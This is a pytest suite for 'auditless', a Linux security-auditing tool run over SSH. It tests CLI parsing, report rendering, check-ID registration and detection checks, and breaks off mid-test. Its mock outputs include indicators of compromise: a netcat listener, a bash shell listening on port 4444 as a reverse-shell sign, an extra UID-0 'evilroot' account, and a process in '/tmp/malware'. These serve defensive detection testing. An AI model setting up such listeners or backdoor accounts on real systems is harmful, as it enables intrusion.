import json
import sys
import tempfile
import warnings
from pathlib import Path
from unittest.mock import MagicMock, Mock

import pytest

from linux_health.checks import (
    CheckResult,
    DetailedSecurityInfo,
    SystemInfo,
    check_active_reverse_shells,
    check_arp_spoofing,
    check_container_escape_indicators,
    check_crypto_miners,
    check_deleted_file_handles,
    check_dns_tampering,
    check_file_integrity_critical_binaries,
    check_hidden_files_in_system_dirs,
    check_kernel_module_integrity,
    check_log_tampering,
    check_privilege_escalation_vectors,
    check_suspicious_network_connections,
    check_weak_password_policy,
    check_world_writable_system_files,
    disable_command_cache,
    gather_rkhunter_scan,
    gather_system_info,
    gather_unused_packages,
    reset_command_cache,
    run_all_checks,
)
from linux_health.cli import build_parser, main, parse_ports
from linux_health.report import render_report, render_report_json, render_report_text
from linux_health.scanner import COMMON_PORTS, PortStatus


# Disable command caching for tests to ensure fresh mocks
@pytest.fixture(scope="session", autouse=True)
def _disable_cache_for_tests():
    """Disable command cache during testing to prevent stale mock data."""
    disable_command_cache()
    yield
    reset_command_cache()


class TestParsePortsUtil:
    """Tests for port parsing utility"""

    def test_parse_ports_with_none_returns_common_ports(self):
        """Test that None returns default common ports"""
        result = parse_ports(None)
        assert result == COMMON_PORTS

    def test_parse_ports_with_empty_string_returns_common_ports(self):
        """Test that empty string returns default common ports"""
        result = parse_ports("")
        assert result == COMMON_PORTS

    def test_parse_ports_with_single_port(self):
        """Test parsing a single port"""
        result = parse_ports("8080")
        assert result == [8080]

    def test_parse_ports_with_multiple_ports(self):
        """Test parsing multiple comma-separated ports"""
        result = parse_ports("22,80,443")
        assert result == [22, 80, 443]

    def test_parse_ports_with_whitespace(self):
        """Test parsing ports with extra whitespace"""
        result = parse_ports("22, 80, 443")
        assert result == [22, 80, 443]

    def test_parse_ports_with_invalid_port_raises_error(self):
        """Test that invalid port raises ArgumentTypeError"""
        from argparse import ArgumentTypeError

        with pytest.raises(ArgumentTypeError):
            parse_ports("invalid,22")


class TestRenderReportPorts:
    """Tests for port scan rendering behavior"""

    def _base_system(self):
        return SystemInfo(
            hostname="example",
            kernel="5.15",
            os="Ubuntu",
            uptime="1 day",
            users="1",
        )

    def test_text_report_omits_closed_ports(self):
        system = self._base_system()
        ports = [
            PortStatus(port=22, open=True, reason="Connected"),
            PortStatus(port=80, open=False, reason="timeout"),
        ]

        report = render_report_text(system, [], ports)

        assert "Port    22" in report
        assert "Port    80" not in report
        assert "closed/filtered" not in report

    def test_markdown_report_summarizes_when_no_open_ports(self):
        system = self._base_system()
        ports = [PortStatus(port=25, open=False, reason="timeout")]

        report = render_report(system, [], ports)

        assert "| none | closed/filtered" in report
        assert "| 25 |" not in report

    def test_text_report_shows_summary_when_no_open_ports(self):
        system = self._base_system()
        ports = [PortStatus(port=25, open=False, reason="timeout")]

        report = render_report_text(system, [], ports)

        assert "No open ports found" in report
        assert "Port    25" not in report


class TestBuildParser:
    """Tests for CLI argument parser"""

    def test_parser_branding_auditless_primary(self):
        """Parser presents auditless as primary with alias epilog"""
        parser = build_parser()
        assert parser.prog == "auditless"
        assert "Auditless" in (parser.description or "")
        assert "linux-health" in (parser.epilog or "")

    def test_parser_accepts_hostname_and_username(self):
        """Test parser accepts required hostname and username arguments"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.hostname == "localhost"
        assert args.username == "root"

    def test_parser_has_default_port_22(self):
        """Test parser has default SSH port of 22"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.port == 22

    def test_parser_accepts_custom_port(self):
        """Test parser accepts custom SSH port"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--port", "2222"])
        assert args.port == 2222

    def test_parser_format_defaults_to_text(self):
        """Test output format defaults to text"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.format == "text"

    def test_parser_accepts_markdown_format(self):
        """Test parser accepts markdown output format"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--format", "md"])
        assert args.format == "md"

    def test_parser_asks_for_password(self):
        """Test parser recognizes ask-password flag"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password", "--ask-password"])
        assert args.ask_password is True

    def test_parser_enable_rootkit_scan(self):
        """Test parser recognizes enable-rootkit-scan flag"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--enable-rootkit-scan"]
        )
        assert args.enable_rootkit_scan is True

    def test_parser_rootkit_scan_defaults_to_false(self):
        """Test that rootkit scan is disabled by default"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.enable_rootkit_scan is False

    def test_parser_check_package_hygiene(self):
        """Test parser recognizes check-package-hygiene flag"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--check-package-hygiene"]
        )
        assert args.check_package_hygiene is True

    def test_parser_strict_host_key_checking(self):
        """Test parser recognizes strict-host-key-checking flag"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--strict-host-key-checking"]
        )
        assert args.strict_host_key_checking is True

    def test_parser_strict_host_key_defaults_to_true(self):
        """Strict host key checking is on by default (fail closed)"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.strict_host_key_checking is True

    def test_parser_strict_host_key_opt_out(self):
        """Labs can opt out explicitly with --no-strict-host-key-checking"""
        parser = build_parser()
        args = parser.parse_args(
            ["localhost", "root", "password", "--no-strict-host-key-checking"]
        )
        assert args.strict_host_key_checking is False

    def test_parser_package_hygiene_defaults_to_false(self):
        """Test that package hygiene check is disabled by default"""
        parser = build_parser()
        args = parser.parse_args(["localhost", "root", "password"])
        assert args.check_package_hygiene is False


class TestAliasDeprecation:
    """linux-health entry point warns but keeps working through v3.x"""

    def test_alias_emits_warning_and_stderr(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture
    ) -> None:
        """Invoking as linux-health warns (both channels) yet still parses."""
        monkeypatch.setattr(sys, "argv", ["linux-health"])
        with pytest.warns(DeprecationWarning, match="deprecated"):
            with pytest.raises(SystemExit):
                main([])
        assert "deprecated" in capsys.readouterr().err

    def test_alias_exe_suffix_warns(
        self, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture
    ) -> None:
        """Windows linux-health.exe triggers the same notice."""
        monkeypatch.setattr(sys, "argv", [r"C:\tools\linux-health.exe"])
        with pytest.warns(DeprecationWarning, match="v4.0"):
            with pytest.raises(SystemExit):
                main([])
        capsys.readouterr()

    def test_primary_name_is_silent(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Invoking as auditless emits no deprecation warning."""
        monkeypatch.setattr(sys, "argv", ["auditless"])
        with warnings.catch_warnings():
            warnings.simplefilter("error")
            with pytest.raises(SystemExit):
                main([])


class TestCheckTestIdRegistry:
    """Every registry check emits its mapped test ID at runtime."""

    def test_registry_covers_run_all_checks(self):
        """All functions invoked by run_all_checks carry an identifier."""
        import inspect
        import re

        import linux_health.checks as checks_mod
        from linux_health.test_ids import CHECK_TEST_IDS

        called = set(
            re.findall(r"\b(check_\w+)\(", inspect.getsource(checks_mod._check_thunks))
        )
        missing = {
            fn for fn in called if fn.startswith("check_") and fn not in CHECK_TEST_IDS
        }
        assert not missing, f"checks without test IDs: {sorted(missing)}"

    def test_registry_covers_submodule_checks(self):
        """Every check in the satellite modules is registered (no XXXX)."""
        import inspect
        import re

        import linux_health.checks_audit as audit_mod
        import linux_health.checks_database as database_mod
        import linux_health.checks_filesystem as filesystem_mod
        import linux_health.checks_packages as packages_mod
        from linux_health.test_ids import CHECK_TEST_IDS

        modules = (audit_mod, filesystem_mod, database_mod, packages_mod)
        for mod in modules:
            names = {
                name
                for name, fn in inspect.getmembers(mod, inspect.isfunction)
                if name.startswith("check_")
            }
            missing = names - set(CHECK_TEST_IDS)
            assert not missing, f"{mod.__name__} unregistered: {sorted(missing)}"
            for name in sorted(names):
                doc = inspect.getdoc(getattr(mod, name)) or ""
                match = re.search(r"Test ID:\s*([A-Z]+-\d+)", doc)
                assert match, f"{name} missing docstring Test ID"
                assert CHECK_TEST_IDS[name] == match.group(1), name

    def test_crash_paths_emit_real_ids(self):
        """Exploding checks fail with registry IDs, never XXXX fallbacks."""
        import re

        from unittest.mock import MagicMock

        from linux_health.checks_audit import run_all_audit_checks
        from linux_health.checks_database import run_all_database_checks
        from linux_health.checks_filesystem import run_all_filesystem_checks
        from linux_health.checks_packages import run_all_package_management_checks

        def exploding_ssh() -> MagicMock:
            def boom(command: str, timeout: float = 10.0) -> tuple:  # type: ignore[return]
                raise RuntimeError("transport gone (test)")

            ssh = MagicMock()
            ssh.hostname = "crash-test"
            ssh._client = None
            ssh.run = boom
            return ssh

        runners = (
            run_all_audit_checks,
            run_all_filesystem_checks,
            run_all_database_checks,
            run_all_package_management_checks,
        )
        for run_all in runners:
            results = run_all(exploding_ssh(), "")
            assert results, run_all.__name__
            for result in results:
                assert re.fullmatch(r"[A-Z]+-\d+", result.test_id), (
                    run_all.__name__,
                    result.test_id,
                )

    @pytest.mark.parametrize(
        "func_name,test_id",
        sorted(
            __import__(
                "linux_health.test_ids", fromlist=["CHECK_TEST_IDS"]
            ).CHECK_TEST_IDS.items()
        ),
    )
    def test_check_emits_mapped_id(self, func_name, test_id):
        """Each mapped check stamps results with its registry ID."""
        import inspect
        from unittest.mock import MagicMock

        import linux_health.checks as checks_mod
        import linux_health.checks_audit as audit_mod
        import linux_health.checks_database as database_mod
        import linux_health.checks_filesystem as filesystem_mod
        import linux_health.checks_packages as packages_mod

        fn = None
        for mod in (checks_mod, audit_mod, filesystem_mod, database_mod, packages_mod):
            fn = getattr(mod, func_name, None)
            if fn is not None:
                break
        assert fn is not None, f"{func_name} found in no check module"
        mock_ssh = MagicMock()
        mock_ssh._client = None  # force the ssh.run() path in _run
        mock_ssh.run.return_value = (0, "", "")
        if "password" in inspect.signature(fn).parameters:
            result = fn(mock_ssh, "")
        else:
            result = fn(mock_ssh)
        results = result if isinstance(result, list) else [result]
        assert results, f"{func_name} returned no results"
        for item in results:
            assert (
                item.test_id == test_id
            ), f"{func_name}: {item.test_id!r} != {test_id!r}"


class TestMainScanOrchestration:
    """End-to-end main() flow with a stubbed SSH backend (no network)."""

    def _patch_all(self, monkeypatch, **overrides):
        from linux_health import cli
        from linux_health.checks import CheckResult, SystemInfo

        info = SystemInfo("h", "TestOS 1.0", "1.0", "1 day", "u")
        check = CheckResult("C", "Item", "pass", "d", "r", test_id="T-1")

        class FakeSession:
            kwargs = None

            def __init__(self, **kwargs):
                FakeSession.kwargs = kwargs

            def __enter__(self):
                return self

            def __exit__(self, *args):
                return False

        monkeypatch.setattr(cli, "SSHSession", FakeSession)
        monkeypatch.setattr(cli, "gather_system_info", lambda ssh: info)
        monkeypatch.setattr(cli, "run_all_checks", lambda ssh, pw: [check])
        monkeypatch.setattr(
            cli,
            "run_all_checks_parallel",
            lambda ssh, pw, max_workers=8, check_timeout=None: [check],
        )
        for name in (
            "run_all_database_checks",
            "run_all_audit_checks",
            "run_all_filesystem_checks",
            "run_all_package_management_checks",
            "run_all_container_checks",
            "run_all_webserver_checks",
            "run_all_dns_checks",
        ):
            monkeypatch.setattr(cli, name, lambda *a, **k: [])
        for name in (
            "gather_suid_binaries",
            "gather_root_logins",
            "gather_successful_ssh_logins",
            "gather_failed_ssh_logins",
            "gather_top_processes",
            "gather_disk_usage_dirs",
            "gather_available_updates",
            "gather_firewall_rules",
            "gather_sshd_config_check",
            "gather_failed_systemd_units",
            "gather_sudoers_info",
            "gather_critical_file_permissions",
            "gather_rkhunter_scan",
            "gather_unused_packages",
        ):
            monkeypatch.setattr(cli, name, lambda *a, **k: "x")
        from linux_health.scanner import PortStatus as _PortStatus

        monkeypatch.setattr(
            cli,
            "scan_ports",
            lambda host, ports: [
                _PortStatus(port=p, open=True, reason="x") for p in ports
            ],
        )
        return FakeSession

    def test_main_text_scan_prints_report(self, monkeypatch, capsys):
        from linux_health import cli

        self._patch_all(monkeypatch)
        assert cli.main(["h", "u", "pw"]) == 0
        assert "h" in capsys.readouterr().out

    def test_main_jobs_flag_selects_runner(self, monkeypatch):
        """--jobs 1 runs sequential, default/>1 runs the parallel pool."""
        from linux_health import cli

        self._patch_all(monkeypatch)
        calls: list[str] = []
        check = CheckResult("C", "Item", "pass", "d", "r", test_id="T-1")
        monkeypatch.setattr(
            cli, "run_all_checks", lambda ssh, pw: calls.append("seq") or [check]
        )
        monkeypatch.setattr(
            cli,
            "run_all_checks_parallel",
            lambda ssh, pw, max_workers=8, check_timeout=None: calls.append("par")
            or [check],
        )
        assert cli.main(["h", "u", "pw", "--jobs", "1"]) == 0
        assert cli.main(["h", "u", "pw"]) == 0
        assert cli.main(["h", "u", "pw", "--jobs", "8"]) == 0
        assert calls == ["seq", "par", "par"]

    def test_main_deadline_partial_report(self, monkeypatch, tmp_path):
        """Expired deadline renders completed phases plus a WARN marker."""
        import json

        from linux_health import cli

        self._patch_all(monkeypatch)
        ticks = iter([1000.0, 1000.0, 9999.0])
        monkeypatch.setattr(cli.time, "monotonic", lambda: next(ticks, 9999.0))
        out = tmp_path / "r.json"
        argv = ["h", "u", "pw", "--format", "json", "--output", str(out)]
        assert cli.main(argv + ["--deadline", "60"]) == 0
        report = json.loads(out.read_text(encoding="utf-8"))
        items = [c["item"] for c in report["checks"]]
        assert "Scan deadline exceeded" in items
        assert len(report["checks"]) == 2  # stubbed core check + marker

    def test_main_no_deadline_marker_by_default(self, monkeypatch, tmp_path):
        """Without --deadline the scan completes with no truncation marker."""
        import json

        from linux_health import cli

        self._patch_all(monkeypatch)
        out = tmp_path / "r.json"
        argv = ["h", "u", "pw", "--format", "json", "--output", str(out)]
        assert cli.main(argv) == 0
        report = json.loads(out.read_text(encoding="utf-8"))
        assert all(c["item"] != "Scan deadline exceeded" for c in report["checks"])

    def test_main_no_cache_restores_state(self, monkeypatch):
        """--no-cache disables for one scan, then restores prior state."""
        from linux_health import cli
        from linux_health.checks import (
            disable_command_cache,
            enable_command_cache,
            is_command_cache_enabled,
        )

        self._patch_all(monkeypatch)
        try:
            enable_command_cache()
            assert cli.main(["h", "u", "pw"]) == 0
            assert is_command_cache_enabled() is True
            assert cli.main(["h", "u", "pw", "--no-cache"]) == 0
            assert is_command_cache_enabled() is True
            disable_command_cache()
            assert cli.main(["h", "u", "pw"]) == 0
            assert is_command_cache_enabled() is False
        finally:
            disable_command_cache()

    def test_main_aborts_on_sudo_failure(self, monkeypatch, capsys):
        """Wrong sudo password fails fast with a clear, secret-free error."""
        from linux_health import cli

        self._patch_all(monkeypatch)
        monkeypatch.setattr(cli, "_preflight_sudo", lambda ssh, pw: False)
        with pytest.raises(SystemExit) as exc_info:
            cli.main(["h", "u", "pw"])
        assert exc_info.value.code == 2
        err = capsys.readouterr().err
        assert "sudo authentication failed" in err
        assert "--ask-password" in err

    def test_main_proceeds_on_sudo_success(self, monkeypatch):
        """Verified sudo continues into the normal scan."""
        from linux_health import cli

        self._patch_all(monkeypatch)
        monkeypatch.setattr(cli, "_preflight_sudo", lambda ssh, pw: True)
        assert cli.main(["h", "u", "pw"]) == 0

    def test_main_skips_preflight_without_password(self, monkeypatch):
        """Key-auth scans never probe sudo (nothing to verify)."""
        from linux_health import cli

        self._patch_all(monkeypatch)

        def boom(ssh: object, password: str) -> bool:
            raise AssertionError("preflight must not run without a password")

        monkeypatch.setattr(cli, "_preflight_sudo", boom)
        assert cli.main(["h", "u", "", "--key-file", "/k"]) == 0

    def test_preflight_sudo_paths(self, monkeypatch):
        """Probe truth table: success, failure, and inconclusive sessions."""
        from unittest.mock import MagicMock, Mock

        from linux_health import cli

        def session_for(outputs):
            ssh = Mock()
            ssh._client = None
            ssh.run = MagicMock(side_effect=list(outputs))
            return ssh

        assert cli._preflight_sudo(session_for([(0, "", "")]), "pw") is True
        assert cli._preflight_sudo(session_for([(1, "", "")]), "pw") is False
        assert cli._preflight_sudo(session_for([(0, "", "")]), "") is True

        def boom(command, timeout=10.0):
            raise RuntimeError("transport gone")

        odd = Mock()
        odd._client = None
        odd.run = boom
        assert cli._preflight_sudo(odd, "pw") is True

    def test_main_json_scan_writes_file(self, monkeypatch, tmp_path):
        import json

        from linux_health import cli

        self._patch_all(monkeypatch)
        out = tmp_path / "r.json"
        assert cli.main(["h", "u", "pw", "--format", "json", "--output", str(out)]) == 0
        assert (
            json.loads(out.read_text(encoding="utf-8"))["summary"]["total_checks"] == 1
        )

    def test_main_markdown_scan_writes_file(self, monkeypatch, tmp_path):
        from linux_health import cli

        self._patch_all(monkeypatch)
        out = tmp_path / "r.md"
        assert cli.main(["h", "u", "pw", "--format", "md", "--output", str(out)]) == 0
        assert out.read_text(encoding="utf-8")

    def test_main_passes_key_and_strict_flags(self, monkeypatch):
        from linux_health import cli

        fake = self._patch_all(monkeypatch)
        assert (
            cli.main(["h", "u", "", "--key-file", "/k", "--strict-host-key-checking"])
            == 0
        )
        assert fake.kwargs["key_path"] == "/k"
        assert fake.kwargs["strict_host_key_checking"] is True

    def test_main_ssh_failure_exits_2(self, monkeypatch, capsys):
        from linux_health import cli

        self._patch_all(monkeypatch)

        class Boom:
            def __init__(self, **kwargs):
                pass

            def __enter__(self):
                raise ConnectionError("nope")

            def __exit__(self, *args):
                return False

        monkeypatch.setattr(cli, "SSHSession", Boom)
        with pytest.raises(SystemExit):
            cli.main(["h", "u", "pw"])
        assert "SSH failed" in capsys.readouterr().err


class TestCheckResult:
    """Tests for CheckResult dataclass"""

    def test_check_result_creation(self):
        """Test creating a CheckResult"""
        result = CheckResult(
            category="Security",
            item="Password Policy",
            status="pass",
            details="Strong password policy enforced",
            recommendation="Keep current settings",
        )
        assert result.category == "Security"
        assert result.status == "pass"
        assert result.item == "Password Policy"

    def test_check_result_with_warning(self):
        """Test CheckResult with warning status"""
        result = CheckResult(
            category="Updates",
            item="System Updates",
            status="warn",
            details="Updates available",
            recommendation="Apply security updates",
        )
        assert result.status == "warn"


class TestSystemInfo:
    """Tests for SystemInfo dataclass"""

    def test_system_info_creation(self):
        """Test creating SystemInfo"""
        info = SystemInfo(
            hostname="ubuntu",
            os="Ubuntu 22.04",
            kernel="5.15.0",
            uptime="30 days",
            users="2 users",
        )
        assert info.hostname == "ubuntu"
        assert info.os == "Ubuntu 22.04"
        assert info.kernel == "5.15.0"


class TestDetailedSecurityInfo:
    """Tests for DetailedSecurityInfo dataclass"""

    def test_security_info_creation(self):
        """Test creating DetailedSecurityInfo"""
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
        )
        assert info.suid_binaries == "5 found"
        assert info.firewall_rules == "iptables: 20 rules"

    def test_security_info_with_rootkit_scan(self):
        """Test creating DetailedSecurityInfo with rkhunter results"""
        rkhunter_output = "Rootkit Hunter version 1.4.6\n[OK] No rootkits detected"
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
            rootkit_scan=rkhunter_output,
        )
        assert info.rootkit_scan == rkhunter_output
        assert "rootkits" in info.rootkit_scan.lower()

    def test_security_info_with_unused_packages(self):
        """Test creating DetailedSecurityInfo with unused packages info"""
        packages_info = "=== Orphaned/Autoremovable Packages ===\nRemov python3-dev"
        info = DetailedSecurityInfo(
            suid_binaries="5 found",
            root_logins="0",
            successful_ssh_logins="10",
            failed_ssh_logins="2",
            top_processes="systemd, sshd, bash",
            disk_usage_dirs="/var: 80%, /home: 50%",
            available_updates="5 updates available",
            firewall_rules="iptables: 20 rules",
            sshd_config_check="OK",
            failed_systemd_units="0",
            sudoers_info="3 entries",
            critical_file_permissions="OK",
            unused_packages=packages_info,
        )
        assert info.unused_packages == packages_info
        assert "python" in info.unused_packages.lower()


class TestGatherSystemInfo:
    """Tests for gather_system_info function"""

    def test_gather_system_info_with_mock_ssh(self):
        """Test gathering system info with mocked SSH session"""
        # Create mock SSH session
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "ubuntu\n", ""),  # hostname
                (0, "5.15.0-107\n", ""),  # kernel
                (0, "Ubuntu 22.04.5 LTS\n", ""),  # os
                (0, "up 30 days\n", ""),  # uptime
                (0, "2\n", ""),  # users
            ]
        )

        info = gather_system_info(mock_ssh)
        assert info.hostname == "ubuntu\n"
        assert "Ubuntu" in info.os

    def test_gather_system_info_os_command_sources_release_file(self):
        """OS probe must source /etc/os-release (no dangling else)."""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "Ubuntu 22.04.5 LTS", ""))
        gather_system_info(mock_ssh)
        os_cmd = mock_ssh.run.call_args_list[2].args[0]
        assert "/etc/os-release" in os_cmd
        assert "if " in os_cmd and "else" in os_cmd and "fi" in os_cmd


class TestRunAllChecks:
    """Tests for run_all_checks function"""

    def test_run_all_checks_returns_list(self):
        """Test that run_all_checks returns a list of CheckResult objects"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "test output", ""))

        results = run_all_checks(mock_ssh, password="")
        assert isinstance(results, list)
        assert all(isinstance(r, CheckResult) for r in results)

    def test_run_all_checks_has_results(self):
        """Test that run_all_checks returns at least some results"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "test output", ""))

        results = run_all_checks(mock_ssh, password="")
        assert len(results) > 0


class TestGatherRkhunterScan:
    """Tests for gather_rkhunter_scan function"""

    def test_rkhunter_not_installed_returns_none(self):
        """Test that None is returned when rkhunter is not installed"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "not_found", ""))

        result = gather_rkhunter_scan(mock_ssh)
        assert result is None

    def test_rkhunter_installed_and_scan_successful(self):
        """Test successful rkhunter scan"""
        mock_ssh = Mock()
        scan_output = "Rootkit Hunter version 1.4.6\n[OK] No rootkits detected\n[OK] All checks passed"
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (0, scan_output, ""),  # actual scan
            ]
        )

        result = gather_rkhunter_scan(mock_ssh)
        assert result is not None
        assert "Rootkit Hunter" in result or "rootkit" in result.lower()

    def test_rkhunter_scan_with_password(self):
        """Test rkhunter scan with sudo password"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (0, "[OK] No rootkits detected", ""),  # actual scan with sudo
            ]
        )

        result = gather_rkhunter_scan(mock_ssh, password="test_password")
        assert result is not None
        assert "OK" in result or "rootkit" in result.lower()

    def test_rkhunter_scan_failure_returns_error_message(self):
        """Test rkhunter scan failure handling"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "found", ""),  # which rkhunter check
                (1, "", "rkhunter command failed"),  # scan fails
            ]
        )

        result = gather_rkhunter_scan(mock_ssh)
        assert result == "rkhunter scan failed or produced no output"


class TestCheckAccounts:
    """Tests for UID 0 account enumeration (AUTH-9234)."""

    def test_single_root_passes(self):
        """Only root with UID 0 is clean."""
        from unittest.mock import MagicMock, Mock

        from linux_health.checks import check_accounts

        mock_ssh = Mock()
        mock_ssh._client = None
        mock_ssh.run = MagicMock(return_value=(0, "root\n", ""))

        result = check_accounts(mock_ssh)
        assert result.status == "pass"

    def test_multiple_uid_zero_fails(self):
        """Extra UID 0 accounts are a backdoor indicator (fail, not warn)."""
        from unittest.mock import MagicMock, Mock

        from linux_health.checks import check_accounts

        mock_ssh = Mock()
        mock_ssh._client = None
        mock_ssh.run = MagicMock(return_value=(0, "root\nevilroot\n", ""))

        result = check_accounts(mock_ssh)
        assert result.status == "fail"
        assert "evilroot" in result.details


class TestCheckStaleUserAccounts:
    """Tests for stale user account detection"""

    def test_stale_user_check_returns_result(self):
        """Test that stale user account check returns a CheckResult"""
        from linux_health.checks import check_stale_user_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_stale_user_accounts(mock_ssh)
        assert result is not None
        assert hasattr(result, "status")
        assert result.status in ["pass", "warn", "fail"]

    def test_no_stale_users_returns_pass(self):
        """Test when no stale users found"""
        from linux_health.checks import check_stale_user_accounts

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_stale_user_accounts(mock_ssh)
        assert result.status == "pass"


class TestCheckAbnormalNetworkProcesses:
    """Tests for abnormal network process detection"""

    def test_normal_services_returns_pass(self):
        """Test that normal services return PASS"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        # Simulate normal listening services (ssh, http, dns)
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid=5678,fd=5))
LISTEN 0 128 0.0.0.0:443 0.0.0.0:* users:(("nginx",pid=5678,fd=6))
LISTEN 0 128 127.0.0.1:53 0.0.0.0:* users:(("dnsmasq",pid=9999,fd=10))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"

    def test_suspicious_netcat_detected(self):
        """Test detection of netcat listener"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:9999 0.0.0.0:* users:(("nc",pid=6789,fd=4))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "warn"
        assert "nc" in result.details.lower() or "netcat" in result.details.lower()

    def test_suspicious_shell_detected(self):
        """Test detection of shell listening"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        output = """LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("bash",pid=7890,fd=5))"""
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "warn"
        assert (
            "bash" in result.details.lower()
            or "reverse shell" in result.details.lower()
        )

    def test_no_listeners_returns_pass(self):
        """Test when no listeners found"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"

    def test_command_failure_returns_pass(self):
        """Test graceful handling of command failure"""
        from linux_health.checks import check_abnormal_network_processes

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(1, "", "Command error"))

        result = check_abnormal_network_processes(mock_ssh)
        assert result.status == "pass"


class TestGatherUnusedPackages:
    """Tests for gather_unused_packages function"""

    def test_unused_packages_apt_system(self):
        """Test package hygiene check on apt-based system"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "Remov python3-pip python3-dev\n", ""),  # autoremovable packages
                (0, "build-essential\ngcc\n", ""),  # dev packages
                (0, "", ""),  # bloat packages
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result is not None
        assert (
            "apt" not in result
            or "orphan" in result.lower()
            or "build" in result.lower()
        )

    def test_unused_packages_no_packages(self):
        """Test when no unused packages found"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "", ""),  # no autoremovable
                (0, "", ""),  # no dev packages
                (0, "", ""),  # no bloat
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result == "No obvious unused packages detected"

    def test_unused_packages_yum_system(self):
        """Test package hygiene check on yum-based system"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "yum\n", ""),  # detect package manager
                (0, "package-cleanup output\n", ""),  # cleanup output
            ]
        )

        result = gather_unused_packages(mock_ssh)
        assert result is not None

    def test_unused_packages_unknown_manager(self):
        """Test handling of unknown package manager"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "unknown\n", ""))

        result = gather_unused_packages(mock_ssh)
        assert result == "Package manager not detected (apt/yum not found)"

    def test_unused_packages_with_password(self):
        """Test package hygiene with sudo password"""
        mock_ssh = Mock()
        mock_ssh.run = MagicMock(
            side_effect=[
                (0, "apt\n", ""),  # detect package manager
                (0, "Remov package1\n", ""),  # autoremovable with sudo
                (0, "", ""),  # no dev packages
                (0, "", ""),  # no bloat
            ]
        )

        result = gather_unused_packages(mock_ssh, password="test_pass")
        assert result is not None


class TestCheckSuspiciousProcessLocations:
    """Tests for suspicious process location detection"""

    def test_no_suspicious_processes_returns_pass(self):
        """Test when no processes in suspicious locations"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        mock_ssh.run = MagicMock(return_value=(0, "", ""))

        result = check_suspicious_process_locations(mock_ssh)
        assert result.status == "pass"

    def test_process_in_tmp_detected(self):
        """Test detection of process in /tmp"""
        from linux_health.checks import check_suspicious_process_locations

        mock_ssh = Mock()
        output = "bash    1234 user    0r   REG  ... /tmp/malware"
        mock_ssh.run = MagicMock(return_value=(0, output, ""))

        result = check_suspicious_process_locations(mock_ssh)
